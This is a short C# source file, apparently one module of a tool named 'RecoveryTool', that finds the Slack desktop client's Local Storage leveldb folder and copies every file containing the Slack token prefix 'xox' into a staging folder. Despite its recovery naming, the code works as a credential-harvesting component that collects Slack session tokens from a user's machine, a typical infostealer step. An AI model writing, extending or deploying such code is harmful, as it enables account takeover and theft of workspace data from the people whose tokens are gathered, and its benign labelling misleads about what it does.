using RecoveryTool.Recovery.Utilities;

namespace RecoveryTool.Recovery.Messenger
{
    class SlackService
    {
        public static async Task SaveSlackAsync()
        {
            string slackLevelDbPath = Path.Combine(Common.AppData, "Slack", "Local Storage", "leveldb");
            if (Directory.Exists(slackLevelDbPath))
            {
                string slackPath = Common.EnsureSlackPath();
                await MessengerHelper.CopyFilesAsync(slackLevelDbPath, slackPath, fi =>
                {
                    try
                    {
                        var content = File.ReadAllText(fi.FullName);
                        return content.Contains("xox");
                    }
                    catch
                    {
                        return false;
                    }
                });
            }
        }
    }
}